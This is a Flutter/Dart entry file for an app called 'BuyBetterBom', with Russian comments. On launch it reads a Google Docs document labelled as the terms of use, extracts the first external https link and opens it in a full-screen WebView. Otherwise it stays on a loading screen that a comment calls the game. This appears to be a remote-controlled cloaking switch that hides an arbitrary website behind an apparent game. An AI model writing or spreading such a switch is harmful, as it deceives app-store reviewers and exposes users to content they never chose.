import 'dart:async';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:http/http.dart' as http;

import 'constants/app_constants.dart';
import 'screens/loading_screen.dart';
import 'screens/webview_screen.dart';

/// Возвращает первую внешнюю ссылку из Google Docs документа.
/// Если подходящих ссылок нет или произошла ошибка – вернёт null.
Future<String?> _extractFirstUrlFromGoogleDoc(String docUrl) async {
  try {
    print('[DOC] Incoming Google Docs URL: $docUrl');

    // Для опубликованных документов Google Docs просим текстовую версию,
    // чтобы не разбирать HTML и не цеплять служебные ссылки/ресурсы.
    final originalUri = Uri.parse(docUrl);
    Uri txtUri;

    if (originalUri.path.endsWith('/pub')) {
      txtUri = originalUri.replace(
        queryParameters: {
          ...originalUri.queryParameters,
          'output': 'txt',
        },
      );
    } else {
      txtUri = originalUri;
    }

    print('[DOC] Fetching text from: $txtUri');
    final resp = await http.get(txtUri).timeout(const Duration(seconds: 8));
    print('[DOC] Response status: ${resp.statusCode}');
    if (resp.statusCode != 200) {
      print('[DOC] Non‑200 status, returning null.');
      return null;
    }

    final text = resp.body;

    // Ищем только https-ссылки (в документе у пользователя всегда https).
    // Так отсекаем служебные http (например w3.org/2000/svg из HTML).
    final urlRegex = RegExp(r'https://[^\s"<>]+', multiLine: true);
    final matches = urlRegex.allMatches(text);

    for (final m in matches) {
      final candidate = text.substring(m.start, m.end);
      print('[DOC] Found URL candidate: $candidate');

      // Отбрасываем любые гугловские/служебные ссылки – нам нужна внешняя.
      final lower = candidate.toLowerCase();
      if (lower.contains('docs.google') ||
          lower.contains('google.') ||
          lower.contains('googleapis') ||
          lower.contains('withgoogle') ||
          lower.contains('gstatic.') ||
          lower.contains('googleusercontent.')) {
        print('[DOC] Skipped (google/service) URL: $candidate');
        continue;
      }

      print('[DOC] Using external URL: $candidate');
      return candidate;
    }

    print('[DOC] No suitable external URL found in document.');
    return null;
  } catch (_) {
    print('[DOC] Exception while parsing Google Doc, returning null.');
    return null;
  }
}

Future<String?> _fetchRedirectUrl() async {
  try {
    print('[APP] Starting redirect URL fetch.');
    // Теперь мы сразу работаем с Google Docs ссылкой, заданной в константах.
    final docsUrl = AppConstants.termsOfUseUrl;
    print('[APP] Using Docs URL from constants: $docsUrl');

    if (!docsUrl.contains('docs.google')) {
      // Если по какой‑то причине там не Google Docs – считаем это конечной ссылкой.
      print('[APP] Docs URL is not Google Docs, returning it directly.');
      return docsUrl;
    }

    // Пытаемся вытащить первую внешнюю ссылку из документа.
    final innerUrl = await _extractFirstUrlFromGoogleDoc(docsUrl);
    print('[APP] Extracted inner URL: $innerUrl');
    return innerUrl;
  } catch (_) {
    print('[APP] Exception while fetching redirect URL, returning null.');
    return null;
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await SystemChrome.setPreferredOrientations(const [
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);

  runApp(const BuyBetterBomApp());
}

class BuyBetterBomApp extends StatelessWidget {
  const BuyBetterBomApp({super.key});

  @override
  Widget build(BuildContext context) {
    return CupertinoApp(
      title: 'BuyBetterBom',
      debugShowCheckedModeBanner: false,
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
      ],
      supportedLocales: const [Locale('en', 'US')],

      home: FutureBuilder<String?>(
        future: _fetchRedirectUrl(),
        builder: (context, snapshot) {
          if (snapshot.connectionState != ConnectionState.done) {
            return const LoadingScreen();
          }

          final url = snapshot.data?.trim();

          // Если конечная ссылка не получена – запускаем игру.
          if (url == null || url.isEmpty) {
            return const LoadingScreen();
          }
          // Есть валидная ссылка – открываем её в WebView.
          return WebViewScreen(url: url);
        },
      ),
    );
  }
}